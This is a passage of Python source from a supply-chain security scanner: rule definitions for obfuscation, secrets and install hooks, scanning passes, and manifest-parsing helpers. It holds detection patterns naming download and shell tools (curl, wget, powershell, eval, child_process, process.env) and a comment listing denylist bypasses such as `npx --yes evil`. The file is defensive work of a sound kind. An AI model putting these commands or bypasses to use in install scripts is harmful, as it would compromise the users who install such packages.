        if not i & 63:
            ctx.check_time()
        has_decode = decode_re.search(code) is not None
        if not decoded and not has_decode:
            continue
        blank = _blank_strings(code)
        events = [(m.start(), 0, m) for m in _DEP_ASSIGN_RE.finditer(blank)]
        events += [(m.start(), 1, m) for m in _DECODE_SINK_RE.finditer(blank)]
        events += [(m.start(), 2, m) for m in _INDIRECT_SINK_RE.finditer(code)
                   if blank[m.start()] == code[m.start()]]
        events.sort(key=lambda e: (e[0], e[1]))
        close = None

        def live(a, b, at):
            """Decodes behind the decoded names in blank[a:b], still in reach at `at`."""
            return [decoded[v] for v in set(ident_re.findall(blank, a, b))
                    if v in decoded and at - decoded[v][1] <= DEP_FLOW_WINDOW]

        for n, (pos, kind, m) in enumerate(events):
            if n and not n & 255:     # one long line can hold thousands of statements
                ctx.check_time()
            at = base + pos
            if kind == 0:
                a, b = m.span(2)
                if decode_re.search(code, a, b):
                    decoded[m.group(1)] = (i + 1, at)
                    continue
                src = live(a, b, at)
                if src:
                    decoded[m.group(1)] = max(src, key=lambda d: d[1])
                continue
            if i + 1 in have:
                continue
            if kind == 1:
                if not _is_code_sink(code, m, cp_aliases):
                    continue
                if _FN_DEF_BEFORE_RE.search(blank[max(0, m.start(2) - 24):m.start(2)]):
                    continue                  # a definition, not a call
            if close is None:
                close = _paren_close_map(blank)
            closed = close.get(m.end() - 1)
            if closed is not None and blank[closed + 1:closed + 2 + DEP_SINK_ARGS_MAX].lstrip()[:1] == "{":
                continue                      # `exec(a, b) {`: a method definition
            end = min(len(blank) if closed is None else closed, m.end() + DEP_SINK_ARGS_MAX)
            src = live(m.end(), end, at)
            if src:
                msg = _DECODE_FLOW_MSG.format(line=min(d[0] for d in src))
            elif decode_re.search(code, m.end(), end):
                msg = _DECODE_SAME_CALL_MSG
            else:
                continue
            have.add(i + 1)
            issues.append(mk_issue(dict(rule, msg=msg), path, i + 1, ctx.lines, m.start()))


# ---------------- The per-line pass's findings ----------------
# The texts of the findings _scan_file makes, as module-level values, so the
# rule pack carries them and the native engine builds the same findings from
# them (docs/RUST_ENGINE.md). A "msg" (or "fix") with {fields} is a
# str.format template, filled where the finding is made.
_LONGLINE_RULE = {
    "id": "Q-LONGLINE", "name": "Line too long", "type": "SMELL", "sev": "MINOR",
    "msg": f"Line exceeds {LONG_LINE} characters.",
    "why": "Very long lines hurt readability and reviews.",
    "fix": "Break the line up for readability.", "ref": "Maintainability"}
_HEXSTR_TEXT_RULE = {
    "id": "SC-HEXSTR", "name": "Hex-escaped readable text", "type": "HOTSPOT", "sev": "MAJOR",
    "msg": "Hex escapes hide readable text: {preview!r}.",
    "why": ("Escaping ordinary printable characters serves no purpose except hiding "
            "them from review and search; this text is readable once decoded."),
    "fix": "Decode the string and review what it does.",
    "ref": "CWE-506 · Supply chain"}
# ... CRITICAL, with this "why", when the text names code execution, a download or a URL
_HEXSTR_DANGER_WHY = ("Escaping ordinary printable characters serves no purpose except hiding "
                      "them from review and search; this text names code execution, a download, or a URL.")
_HEXSTR_NAME_RULE = {
    "id": "SC-HEXSTR", "name": "Hex-escaped readable text", "type": "HOTSPOT", "sev": "CRITICAL",
    "msg": "Escape sequences hide a name: {name!r}.",
    "why": ("Nothing needs to escape a letter of a name like this one: writing it as "
            "escape sequences only hides it from review and search, and this one "
            "names code execution, a download, or a URL."),
    "fix": "Decode the string and review what it does.",
    "ref": "CWE-506 · Supply chain"}
_CHARCODE_RULE = {
    "id": "SC-CHARCODE", "name": "Char-code string building", "type": "HOTSPOT", "sev": "MAJOR",
    "msg": "String assembled from character codes — obfuscation indicator.",
    "why": "fromCharCode chains hide payloads from static review.",
    "fix": "Decode and review what string is being built.",
    "ref": "CWE-506 · Supply chain"}
_B64_RULE = {
    "id": "SC-B64", "name": "Large base64 blob", "type": "HOTSPOT", "sev": "MAJOR",
    "msg": "Base64 blob (200+ chars) embedded in code.",
    "why": "Embedded encoded blobs can carry second-stage payloads.",
    "fix": "Decode and verify the content; move legitimate assets to data files.",
    "ref": "CWE-506 · Supply chain"}
_ENTROPY_RULE = {
    "id": "S-ENTROPY", "name": "High-entropy string", "type": "HOTSPOT", "sev": "MAJOR",
    "msg": "High-entropy string literal — possible hardcoded secret.",
    "why": "Random-looking constants are usually keys or tokens.",
    "fix": "If it is a secret, rotate it and load it from the environment.",
    "ref": "CWE-798 · OWASP A07"}
# (0.1.8: MAJOR. The names are one tool's mark, not what the code does: the
# string arrays and proxy objects that tool writes are read in the decoded
# view, where the install-script and import-time tests see the behaviour.)
_OBF_IDENT_RULE = {
    "id": "SC-OBF-IDENT", "name": "Obfuscated identifier pattern", "type": "HOTSPOT", "sev": "MAJOR",
    "msg": "{n} '_0x…' identifiers — javascript-obfuscator signature.",
    "why": ("This naming pattern is produced by obfuscation tools; in a dependency it is "
            "a classic indicator of a compromised or malicious package."),
    "fix": "Diff against the package's published repository; consider removing the dependency.",
    "ref": "CWE-506 · Supply chain"}
OBF_IDENT_MIN = 5              # distinct '_0x…' names that make SC-OBF-IDENT
PREVIEW_MAX = 60               # characters of decoded or hidden text a message shows


def _preview(text):
    """`text` as a message shows it: at most PREVIEW_MAX characters, "..." marking a cut."""
    return text if len(text) <= PREVIEW_MAX else text[:PREVIEW_MAX - 3] + "..."


def _hexstr_text_rule(hidden):
    """SC-HEXSTR for the readable text a line's hex escapes hide."""
    rule = dict(_HEXSTR_TEXT_RULE, msg=_HEXSTR_TEXT_RULE["msg"].format(preview=_preview(hidden)))
    if HIDDEN_TEXT_DANGER_RE.search(hidden):
        rule.update(sev="CRITICAL", why=_HEXSTR_DANGER_WHY)
    return rule


def _scan_file(path, content, lines, lang, dep, ctx, issues, rules=None):
    if rules is None:
        _scan_rules(path, content, lines, lang, dep, ctx, issues)
    else:
        issues.extend(rules)                # (scan_file_after_rules)
    if dep:
        return
    ctx.check_time()
    if lang == "sql":
        try:
            scan_sql_nowhere(path, content, issues, lines)
        except Exception:
            pass
    ctx.check_time()
    issues.extend(taint_scan(path, lines, lang, ctx))
    # G12: whole-argument SQL-sink analysis (Python only) — catches
    # execute(sql % x) with no space after %, .format() on a template variable,
    # and execute(name) where name was built by interpolation/concatenation.
    # (Project mode only, like every non-supply-chain rule; it used to run
    # in dependency mode too, unlike the JS engine.)
    if lang == "py":
        try:
            sql_sink_analyzer(path, lines, issues, ctx)
        except _ScanBudgetExceeded:
            raise
        except Exception:
            pass
    ctx.check_time()
    for fn in extract_functions(lines, lang):
        if fn["len"] > FN_LEN_LIMIT:
            issues.append(mk_issue(
                {"id": "Q-FN-LONG", "name": "Function too long", "type": "SMELL", "sev": "MAJOR",
                 "msg": f"Function \"{fn['name']}\" is {fn['len']} lines long (limit {FN_LEN_LIMIT}).",
                 "why": "Long functions do too much and resist testing and reuse.",
                 "fix": "Extract cohesive blocks into helper functions.",
                 "ref": "Maintainability"}, path, fn["line"], lines))
        if fn["cx"] > FN_CX_LIMIT:
            issues.append(mk_issue(
                {"id": "Q-FN-CX", "name": "High cyclomatic complexity", "type": "SMELL", "sev": "MAJOR",
                 "msg": f"Function \"{fn['name']}\" has complexity ~{fn['cx']} (limit {FN_CX_LIMIT}).",
                 "why": "Highly branched code is hard to reason about and to cover with tests.",
                 "fix": "Split branches into smaller functions; use early returns or lookup tables.",
                 "ref": "Maintainability"}, path, fn["line"], lines))


def _scan_rules(path, content, lines, lang, dep, ctx, issues):
    """The pattern rules and the families of every line, then the file-level
    ones; then the decode flow across lines (dependency mode) or the
    whole-text rules (project mode). The native engine runs this part in
    both modes (its scan_file and scan_rules)."""
    cmask, mlines = ctx.cmask, ctx.mlines
    rules = [r for r in RULES if lang in r["langs"]
             and (not dep or r["id"].startswith(DEP_RULE_PREFIXES))]
    secret_lines = set()          # lines with S-TOKEN / S-SECRET (S-ENTROPY dedupe)
    file_words = []               # the file's ASCII words, read when a look-alike name needs them

    def words():
        if not file_words:
            file_words.append(frozenset(_ASCII_WORD_RE.findall(content)))
        return file_words[0]
    runs_code = []                # whether the file runs code from a string (SC-HIDDEN-UNICODE severity)

    def file_runs_code():
        if not runs_code:
            runs_code.append(_HIDDEN_EXEC_RE.search(content) is not None)
        return runs_code[0]
    for i, line in enumerate(lines):
        ctx.check_time()
        if not line or line.isspace():
            # no rule or heuristic matches whitespace alone; only the length rule applies
            if not dep and len(line) > LONG_LINE:
                issues.append(mk_issue(_LONGLINE_RULE, path, i + 1, lines))
            continue
        mline = mlines[i]
        for r in rules:
            if cmask[i] and r["id"] not in _COMMENT_LINE_RULES:
                continue
            # equality checks shouldn't match inside string literals
            target = STRING_LIT_RE.sub("\"\"", mline) if r["id"] == "B-EQEQ" else mline
            m = r["re"].search(target)
            col = m.start() if m else None
            if col is None and r["id"] == "SC-EVAL-DECODE" and not cmask[i]:
                col = _joined_eval_decode(ctx, i, r["re"])
            if col is None:
                continue
            if r["need"] and not r["need"].search(mline):
                continue
            if r["skip"] and r["skip"].search(mline):
                continue
            if r["id"] == "S-TOKEN" and not _token_has_material(r["re"], mline, mlines, i):
                continue
            if r["id"] in ("S-TOKEN", "S-SECRET"):
                secret_lines.add(i)
            issues.append(mk_issue(r, path, i + 1, lines, col))
        if not dep and len(line) > LONG_LINE:
            issues.append(mk_issue(_LONGLINE_RULE, path, i + 1, lines))
        # --- obfuscation heuristics (strong supply-chain indicators) ---
        hidden = hex_hidden_text(line)
        if hidden is not None:
            issues.append(mk_issue(_hexstr_text_rule(hidden), path, i + 1, lines,
                                   _HEX_ESCAPE_RE.search(line).start()))
        else:
            name = hex_hidden_name(line)
            if name is not None:
                issues.append(mk_issue(dict(_HEXSTR_NAME_RULE, msg=_HEXSTR_NAME_RULE["msg"].format(name=name[0])),
                                       path, i + 1, lines, name[1]))
        if lang in ("js", "py") and not cmask[i]:
            code = ctx.mcode(i)
            if not code.isascii():
                found = lookalike_name(ctx.names_code(i), lang, words)
                if found is not None:
                    issues.append(lookalike_issue(found, path, i + 1, lines))
            if not dep and _runs_download_through_shell(code):
                issues.append(mk_issue(_PIPE_SHELL_RULE, path, i + 1, lines, _EXEC_CALL_RE.search(code).start()))
        if not line.isascii():
            hrun = hidden_unicode_run(line)
            if hrun is not None:
                issues.append(_hidden_unicode_issue(path, i + 1, lines, hrun[0], hrun[1], file_runs_code()))
        cm_col = _charcode_col(line) if lang == "js" else None
        if cm_col is not None:
            issues.append(mk_issue(_CHARCODE_RULE, path, i + 1, lines, cm_col))
        bm = B64_BLOB_RE.search(line)
        if bm and "sourceMappingURL" not in line:
            issues.append(mk_issue(_B64_RULE, path, i + 1, lines, bm.start()))
        if lang in ("js", "py"):
            off = offscreen_code(line, lang)
            if off is not None and ctx.names_code(i).strip():
                issues.append(_offscreen_issue(path, i + 1, lines, off))
        # --- entropy-based secret detection ---
        # (review fix: the S-TOKEN/S-SECRET dedupe was an any() over every
        # issue so far, per line — 15.7 s on 20k lines; now a set lookup)
        if not cmask[i] and i not in secret_lines and not SECRET_SKIP_RE.search(line):
            em = ENTROPY_VALUE_RE.search(line)
            # the file's literal index holds exactly the entropy_secretish()
            # literals of non-skip lines — computed once, shared with redaction
            if em and em.group(1) in ctx.secrets().lits:
                issues.append(mk_issue(_ENTROPY_RULE, path, i + 1, lines, em.start(1)))
    # file-level: javascript-obfuscator identifier signature
    if lang == "js":
        obf = OBF_IDENT_RE.findall(content)
        if len(set(obf)) >= OBF_IDENT_MIN:
            first_off = content.find(obf[0])
            first_line = content[:first_off].count("\n") + 1
            issues.append(mk_issue(dict(_OBF_IDENT_RULE, msg=_OBF_IDENT_RULE["msg"].format(n=len(set(obf)))),
                                   path, first_line, lines, first_off - content.rfind("\n", 0, first_off) - 1))
    if lang in ("js", "py"):
        at = self_publish_at(content)
        if at >= 0:
            issues.append(mk_issue(_SELF_PUBLISH_RULE, path, content.count("\n", 0, at) + 1, lines,
                                   at - content.rfind("\n", 0, at) - 1))
    if dep:
        _dep_decode_flow(path, ctx, issues)
        return
    mcontent = content if mlines is lines else "\n".join(mlines)
    starts = None
    for r in TEXT_RULES:
        # *-NOWHERE SQL rules are fired by scan_sql_nowhere() (linear pass),
        # not here — their regexes match only the statement head.
        if lang not in r["langs"] or r["id"] in _SQL_NOWHERE_SKIP:
            continue
        last = None
        for n, m in enumerate(r["re"].finditer(mcontent)):
            if not n & 255:           # the time backstop also holds inside one rule
                ctx.check_time()
            if starts is None:        # review fix: was content[:pos].count("\n") per match
                starts = _line_starts(mcontent)
            line_no = bisect.bisect_right(starts, m.start())
            if line_no == last:       # same (rule, line, msg): reported once (cap_issues)
                continue
            last = line_no
            issues.append(mk_issue(r, path, line_no, lines, m.start() - starts[line_no - 1]))

DEP_MARKERS = {"node_modules", "site-packages", "bower_components", "vendor",
               "venv", ".venv"}
INSTALL_HOOK_RE = re.compile(
    r"curl|wget|iwr|Invoke-WebRequest|node\s+-e|bash\s+-c|sh\s+-c|powershell|base64|\beval\b", re.I)
# G11: npm lifecycle scripts — the command list above is a bypassable denylist
# (`npx --yes evil`, `node ./scripts/payload.js`, `git clone … && make` contain
# none of those tokens). Presence of *any* install-time script is itself worth
# a finding: it runs with user privileges on `npm install` before the package
# is reviewed. Since 0.1.8 the list is only a hint in that MAJOR finding's
# message; what escalates a hook is what its command does (hook_command_risk).
# Scripts npm runs when a package is installed as a dependency. Publisher-side
# scripts (prepack, prepublishOnly, postpublish, ...) only ever run on the
# maintainer's machine while packaging a release, so they are not install hooks.
NPM_INSTALL_SCRIPTS = ("preinstall", "install", "postinstall")
# In a checked-out project (not a registry tarball), `npm install` also runs
# the prepare family (preprepare, prepare, postprepare).
NPM_PREPARE_SCRIPTS = ("preprepare", "prepare", "postprepare")
NPM_LOCAL_INSTALL_SCRIPTS = NPM_INSTALL_SCRIPTS + NPM_PREPARE_SCRIPTS
NPM_LIFECYCLE_SCRIPTS = NPM_LOCAL_INSTALL_SCRIPTS   # backwards-compatible name
PY_LIFECYCLE_SECTIONS = ("build-system", "tool.poetry", "project")

def _sc_install_hook_issue(path, line_no, lines, script, cmd, reasons, sev=None, redactor=None, hint=False):
    """SC-INSTALL-HOOK for an install hook's command: CRITICAL with the
    reasons it looks hostile (hook_command_risk), else MAJOR (or `sev`);
    `hint`: the command runs a download or evaluation tool (INSTALL_HOOK_RE),
    worth reading, not evidence (0.1.8)."""
    sev = sev or ("CRITICAL" if reasons else "MAJOR")
    if reasons:
        msg = f'"{script}" script {"; and ".join(reasons)}.'
        why = ("Install hooks execute automatically on npm install — the most common "
               "supply-chain compromise vector — and this command does what malicious "
               "install hooks do.")
    else:
        msg = (f'"{script}" script runs a download or evaluation command at install time: {cmd!r}.' if hint
               else f'"{script}" script runs code at install time: {cmd!r}.')
        why = ("Install hooks run automatically with user privileges on npm install, "
               "before anyone reviews the package. Many legitimate packages use one "
               "(to fetch a platform binary, for example), so on its own this is a "
               "capability to review, not evidence of malice.")
        if sev == "INFO":
            why = ("A prepare-family script runs on `npm install` in this checkout; it "
                   "is the project's own build step (husky, patch-package, a compile), "
                   "listed for inventory. Hostile commands here stay CRITICAL.")
    issue = mk_issue(
        {"id": "SC-INSTALL-HOOK", "name": "Install hook", "type": "HOTSPOT",
         "sev": sev, "msg": msg, "why": why,
         "fix": f"Review the {script} script; use --ignore-scripts in CI if unneeded.",
         "ref": "CWE-506 · Supply chain"}, path, line_no, lines, redactor=redactor)
    issue["cmd"] = cmd   # lets the registry follow the hook to the script it runs
    return issue

# Nesting limit for manifests (package.json, binding.gyp): deeper documents are
# SC-MANIFEST-DEPTH. Measured explicitly (json_depth_exceeds) instead of
# waiting for json.loads to hit the interpreter's recursion limit, which sits
# near 995 levels on Python 3.10/3.11 and near 10,000 on 3.12+ — so the same
# manifest used to be a finding on one interpreter and parse on another, and
# disagree with the npm engine (pycompat.js MAX_JSON_DEPTH, the same 500).
MAX_MANIFEST_DEPTH = 500
MANIFEST_DEPTH_MSG = (f"Manifest is too deeply nested to parse (more than "
                      f"{MAX_MANIFEST_DEPTH} levels).")
_JSON_STRING_RE = re.compile(r'"[^"\\]*(?:\\.[^"\\]*)*"?', re.S)   # unterminated: to the end
_NOT_BRACKET_RE = re.compile(r"[^\[\]{}]+")


def json_depth_exceeds(text, limit=MAX_MANIFEST_DEPTH):
    """True if `text` nests [ / { deeper than `limit`, counting only brackets
    outside JSON (double-quoted) strings — twin of the npm engine's
    jsonDepthExceeds. Linear: the strings and everything but brackets are
    stripped by two non-backtracking regexes, and the remaining brackets are
    walked only when there are more openers than the limit."""
    brackets = _NOT_BRACKET_RE.sub("", _JSON_STRING_RE.sub("", text))
    if brackets.count("[") + brackets.count("{") <= limit:
        return False
    depth = 0
    for ch in brackets:
        if ch in "[{":
            depth += 1
            if depth > limit:
                return True
        else:
            depth -= 1
    return False


class JsonTooDeep(ValueError):
    """A JSON document nested deeper than the limit json_loads_bounded was given."""


def json_loads_bounded(text, limit=MAX_MANIFEST_DEPTH, **kwargs):
    """json.loads for input that may be hostile (scanned-repo content, stored
    results, registry responses, config files): anything nested deeper than
    `limit` raises JsonTooDeep (a ValueError) before parsing starts. The limit
    is ours, not the interpreter's (STRUCTURE.md rule 6): json.loads runs out of
    recursion near 995 levels on 3.10/3.11, near 10,000 on 3.12/3.13 and, on
    3.14, only when the C stack does (a different depth on each OS). bytes are
    decoded the way json.loads decodes them."""
    if isinstance(text, (bytes, bytearray)):
        text = bytes(text).decode(json.detect_encoding(text), "surrogatepass")
    if json_depth_exceeds(text, limit):
        raise JsonTooDeep(f"JSON nested deeper than {limit} levels")
    try:
        return json.loads(text, **kwargs)
    except RecursionError:              # backstop: the caller's stack was already deep
        raise JsonTooDeep(f"JSON nested too deeply to parse (limit {limit} levels)") from None


def _sc_manifest_depth_issue(path):
    """48033f94: a pathologically deep-nested manifest (e.g. 60k+ '[' bytes)
    blows json.loads' recursion limit. The old code crashed the CLI (exit 1,
    results lost) and in registry mode suppressed every other finding in the
    package (scan recorded as 'error' instead of reporting). Both are wins for
    a hostile repo, so this is reported as a CRITICAL supply-chain finding —
    never a crash, never a silent skip. Anything nested deeper than
    MAX_MANIFEST_DEPTH gets it, whatever the interpreter's recursion limit."""
    return mk_issue(
        {"id": "SC-MANIFEST-DEPTH", "name": "Hostile manifest nesting depth",
         "type": "HOTSPOT", "sev": "CRITICAL",
         "msg": MANIFEST_DEPTH_MSG,
         "why": ("A manifest nested this deep cannot be produced by any real "
                 "build tool — it exists purely to crash or blind security "
                 "scanners. Treating it as data would silently drop every "
                 "other finding in the package."),
         "fix": "Reject this package/file at your ingestion boundary; investigate the source.",
         "ref": "CWE-506 · Supply chain"}, path, 1, [])


def manifest_unparseable_issue(path, reason):
    """SC-MANIFEST-UNPARSEABLE (MAJOR): a ROOT package.json / binding.gyp the
    scanner cannot read. npm may still read it (it strips a byte-order mark,
    for one) and run its install hooks, so "nothing to check" is not a clean
    result. The registry turns this into an INCOMPLETE verdict."""
    name = os.path.basename(path.replace("\\", "/")) or path
    return mk_issue(
        {"id": "SC-MANIFEST-UNPARSEABLE", "name": "Unparseable manifest",
         "type": "HOTSPOT", "sev": "MAJOR",
         "msg": f"{name} could not be parsed ({reason}); its install hooks could not be checked.",
         "why": ("Package managers are more forgiving than a strict parser in places (a "
                 "byte-order mark, number formats), so a manifest the scanner cannot read "
                 "may still run install scripts when the package is installed. An "
                 "unreadable root manifest is reported instead of treated as empty."),
         "fix": "Make the manifest valid JSON (binding.gyp: a Python/JSON literal) and "
                "review its scripts by hand.",
         "ref": "CWE-506 · Supply chain"}, path, 1, [])


def is_root_manifest(path):
    """A manifest at the top of the scanned tree / package (no directory part)."""
    return os.path.dirname(path.replace("\\", "/").lstrip("/")) in ("", ".")


def _json_int(text):
    # JavaScript parses every JSON number as a double, so a 5000-digit
    # integer is fine for npm (it becomes Infinity); int() would raise
    # ValueError past sys.int_info.str_digits_check_threshold.
    return int(text) if len(text) <= 1000 else float(text)


# json.loads' message for the closing bracket after a trailing comma on Python
# 3.10-3.12 (3.13+ says "Illegal trailing comma" and points at the comma).
_JSON_TRAILING_COMMA_AT = {"Expecting property name enclosed in double quotes": "}",
                           "Expecting value": "]"}


def json_error_where(exc):
    """"line L column C" of a json.JSONDecodeError, the same on every Python.
    3.13+ reports a trailing comma (`{"a": 1,}`, `[1, ]`) at the comma and
    3.10-3.12 at the bracket after it; this says the comma on every version,
    as the npm engine's pyjson.js does. Any other error is where json.loads
    puts it."""
    doc, pos = exc.doc, exc.pos
    if doc[pos:pos + 1] == _JSON_TRAILING_COMMA_AT.get(exc.msg):
        j = pos - 1
        while j >= 0 and doc[j] in " \t\n\r":
            j -= 1
        if j >= 0 and doc[j] == ",":
            pos = j
    lineno = doc.count("\n", 0, pos) + 1              # as JSONDecodeError counts them
    colno = pos - doc.rfind("\n", 0, pos)
    return f"line {lineno} column {colno}"


def load_manifest(path, content, python_literal=False):
    """Parse manifest-shaped, attacker-controlled text the way the package
    manager does. -> (data, issues).

    A leading UTF-8 BOM is stripped first (npm does). data is None when the
    text cannot be parsed; issues then holds SC-MANIFEST-DEPTH for a document
    nested deeper than MAX_MANIFEST_DEPTH (checked before parsing, so the
    result does not depend on the interpreter's recursion limit or on where
    a syntax error sits), or SC-MANIFEST-UNPARSEABLE when the manifest
    is at the root (a nested unreadable manifest is not a hook npm runs).
    A top level that is not an object counts as unparseable too.
    python_literal: also accept Python literal syntax (binding.gyp / .gypi:
    gyp reads them as Python, so single quotes, comments and trailing commas
    are normal there)."""
    data, issues, _ = _load_manifest(path, content, python_literal)
    return data, issues


def _load_manifest(path, content, python_literal=False, locate=None):
    """load_manifest, plus -> where: with `locate` (a key), for every dict of
    the result that holds that key, {id(d): (d, offset)} where offset is the
    position in the BOM-stripped text of the key token the parser kept (the
    last of equal keys). The parse itself is the same: json.loads (with an
    object_pairs_hook building the same dicts) or ast.literal_eval of the
    ast.parse tree."""
    if not isinstance(content, str):
        return None, ([manifest_unparseable_issue(path, "not text")]
                      if is_root_manifest(path) else []), {}
    text = content[1:] if content.startswith("\ufeff") else content
    if json_depth_exceeds(text):
        return None, [_sc_manifest_depth_issue(path)], {}
    reason, where, built, hook = None, {}, [], None
    if locate is not None:
        def hook(pairs):
            d = dict(pairs)
            built.append((d, pairs))
            return d
    try:
        data = json.loads(text, parse_int=_json_int, object_pairs_hook=hook)
    except RecursionError:              # backstop: a deep caller stack
        return None, [_sc_manifest_depth_issue(path)], {}
    except (ValueError, TypeError) as exc:
        data = None
        reason = (f"{type(exc).__name__}: {json_error_where(exc)}"
                  if isinstance(exc, json.JSONDecodeError) else type(exc).__name__)
    if data is not None and locate is not None:
        where = _json_key_offsets(text, built, locate)
    if data is None and python_literal:
        import ast
        try:
            src = text.strip()
            tree = ast.parse(src, mode="eval")     # what ast.literal_eval(src) parses
            data = ast.literal_eval(tree)
            reason = None
            if locate is not None:
                where = _ast_key_offsets(tree, data, locate, src, len(text) - len(text.lstrip()))
        except RecursionError:
            return None, [_sc_manifest_depth_issue(path)], {}
        except (ValueError, TypeError, SyntaxError, MemoryError, OverflowError) as exc:
            data = None
            reason = reason or type(exc).__name__
    if not isinstance(data, dict):
        if data is not None:
            reason = f"top level is a {type(data).__name__}, not an object"
        return None, ([manifest_unparseable_issue(path, reason or "unparseable")]
                      if is_root_manifest(path) else []), {}
    return data, [], where


# (named apart from _script_key_lines's _JSON_TOKEN_RE, which shadowed it)
_JSON_OBJ_TOKEN_RE = re.compile(r'"[^"\\]*(?:\\.[^"\\]*)*"|[{}]', re.S)
_JSON_COLON_RE = re.compile(r"[ \t\n\r]*:")


def _json_key_offsets(text, built, key):
    """_load_manifest's `where` for a document json.loads parsed: its
    object_pairs_hook saw every object (`built`: (dict, pairs)) in the order
    the objects close, and in valid JSON the keys are exactly the strings
    followed by ':'."""
    objects, stack = [], []
    for m in _JSON_OBJ_TOKEN_RE.finditer(text):
        c = text[m.start()]
        if c == "{":
            stack.append([])
        elif c == "}":
            if not stack:
                return {}
            objects.append(stack.pop())
        elif stack and _JSON_COLON_RE.match(text, m.end()):
            stack[-1].append(m.start())
    if len(objects) != len(built):
        return {}                        # not reachable for text json.loads accepted
    where = {}
    for (d, pairs), offsets in zip(built, objects):
        if len(offsets) != len(pairs):
            return {}
        last = None
        for k, (name, _) in enumerate(pairs):
            if name == key:
                last = k
        if last is not None:
            where[id(d)] = (d, offsets[last])
    return where


_PY_NEWLINE_RE = re.compile(r"\r\n|\r|\n")


def _ast_key_offsets(tree, data, key, src, base):
    """_load_manifest's `where` for a document ast.literal_eval built from
    `tree` (parsed from src, which starts at offset `base` of the text). The
    tree is walked alongside the data; a dict keeps the first of equal keys
    with the last value, so the key token wanted is the last equal one. ast
    positions are (line, UTF-8 byte column) with \\r\\n, \\r and \\n all
    ending a line."""
    import ast
    starts = [0] + [m.end() for m in _PY_NEWLINE_RE.finditer(src)]

    def offset(node):
        a = starts[node.lineno - 1]
        head = src[a:a + node.col_offset].encode("utf-8", "surrogatepass")[:node.col_offset]
        return base + a + len(head.decode("utf-8", "surrogatepass"))

    where, stack = {}, [(tree.body, data)]
    while stack:
        node, value = stack.pop()
        if isinstance(node, ast.Dict) and isinstance(value, dict):
            last = {}
            for k, v in zip(node.keys, node.values):
                last[ast.literal_eval(k)] = (k, v)
            for name, (k, v) in last.items():
                if isinstance(name, str) and name == key:
                    where[id(value)] = (value, offset(k))
                stack.append((v, value[name]))
        elif isinstance(node, (ast.List, ast.Tuple)) and isinstance(value, (list, tuple)):
            stack.extend(zip(node.elts, value))
    return where


def _json_loads_manifest(path, content):
    """Backwards-compatible wrapper: (data, depth_issue). data is None on any
    parse failure; depth_issue is SC-MANIFEST-DEPTH for too-deep input.
    New code uses load_manifest, which also reports unparseable roots."""
    data, issues = load_manifest(path, content)
    depth = next((i for i in issues if i["rule"] == "SC-MANIFEST-DEPTH"), None)
    return data, depth

_NODE_E_RE = re.compile(r"""node\s+-e\s+(?:"((?:\\.|[^"\\])*)"|'((?:\\.|[^'\\])*)'|(\S+))""")
_LOCAL_REQUIRE_RE = re.compile(r"""require\(\s*\\?["'](\.{1,2}/[^"'\\]+)\\?["']\s*\)""")
_INLINE_DANGER_RE = re.compile(
    r"https?|fetch|child_process|exec|spawn|eval|Function|Buffer|atob|base64|net\.|dgram|process\.env")


def _hook_is_suspicious(cmd):
    """Does an install-hook command fetch or evaluate code? `node -e` alone is
    not evidence: core-js's `node -e "try{require('./postinstall')}catch(e){}"`
    only loads a file shipped in the package (which is scanned like any other)."""
    if not INSTALL_HOOK_RE.search(cmd):
        return False
    remainder = cmd
    for m in _NODE_E_RE.finditer(cmd):
        code = next(g for g in m.groups() if g is not None)
        if _LOCAL_REQUIRE_RE.search(code) and not _INLINE_DANGER_RE.search(
                _LOCAL_REQUIRE_RE.sub("", code)):
            remainder = remainder.replace(m.group(0), " ")
    return bool(INSTALL_HOOK_RE.search(remainder))


# ---- Following a hook command to the files it runs (registry) ----
_HOOK_SEPARATORS = {"&&", "||", ";", "|", "&", "(", ")", ";;", "|&"}
_HOOK_REDIRECTS = {">", ">>", "<", "<<", ">&", "<&", "&>", ">|"}
_HOOK_WRAPPERS = {"env", "cross-env", "exec", "command", "nohup", "time", "nice", "sudo",
                  "cross-env-shell", "dotenv"}
_NODE_NAMES = {"node", "nodejs", "node.exe"}
# Other JavaScript runtimes run a file the way node does (0.1.8): `bun x.js`,
# `bun run x.ts`, `deno run -A x.ts`, `tsx x.ts` (a name maps to the
# subcommands that run a file, skipped). What follows is a file of the
# package only when it is a path or a script's name: `bun run build` runs
# the package's build script, `bun install` is a subcommand.
_JS_RUNTIMES = {"bun": frozenset({"run"}), "bun.exe": frozenset({"run"}), "deno": frozenset({"run"}),
                "deno.exe": frozenset({"run"}), "tsx": frozenset(), "ts-node": frozenset(),
                "ts-node-esm": frozenset(), "esno": frozenset(), "babel-node": frozenset(),
                "vite-node": frozenset()}
_RUNTIME_SCRIPT_RE = re.compile(r"\.(?:[cm]?[jt]s|[jt]sx)$", re.I)
_SHELL_NAMES = {"sh", "bash", "dash", "zsh", "ksh", "ash", "sh.exe", "bash.exe"}
_PYTHON_NAME_RE = re.compile(r"^(?:python(?:\d+(?:\.\d+)?)?|py)(?:\.exe)?$", re.I)
_NODE_CODE_FLAGS = {"-e", "--eval", "-p", "--print"}
_NODE_PRELOAD_FLAGS = {"-r", "--require", "--import", "--loader", "--experimental-loader"}
_NODE_VALUE_FLAGS = _NODE_PRELOAD_FLAGS | {"-C", "--conditions", "--input-type", "--env-file",
                                           "--title", "--inspect-port", "--redirect-warnings",
                                           "--report-dir", "--diagnostic-dir", "--cpu-prof-dir",
                                           "--heap-prof-dir", "--watch-path"}
_SCRIPT_EXT_RE = re.compile(r"\.(?:c|m)?js$|\.sh$|\.py$", re.I)
_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")


_HOOK_FALLBACK_TOKEN_RE = re.compile(r"&&|\|\||[;|&()]|[^\s;|&()]+")


_HOOK_SHLEX_MEMO = (None, None)        # the last command shlex read, and its tokens


def _hook_shlex(cmd):
    """shlex's tokens of an npm script (posix, punctuation_chars,
    whitespace_split, no commenters), or None where shlex raises (unbalanced
    quotes). The last command's tokens are kept (a copy is returned): the
    hook follower and the tests ask for the same command more than once, and
    shlex is the slowest part of reading one."""
    global _HOOK_SHLEX_MEMO
    memo = _HOOK_SHLEX_MEMO
    if memo[0] is cmd:
        return None if memo[1] is None else list(memo[1])
    import shlex
    try:
        lex = shlex.shlex(cmd, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        lex.commenters = ""
        tokens = list(lex)
    except ValueError:
        tokens = None
    _HOOK_SHLEX_MEMO = (cmd, tokens)
    return None if tokens is None else list(tokens)


def _hook_tokens(cmd):
    """Shell-like tokenization of an npm script: quotes respected, operators
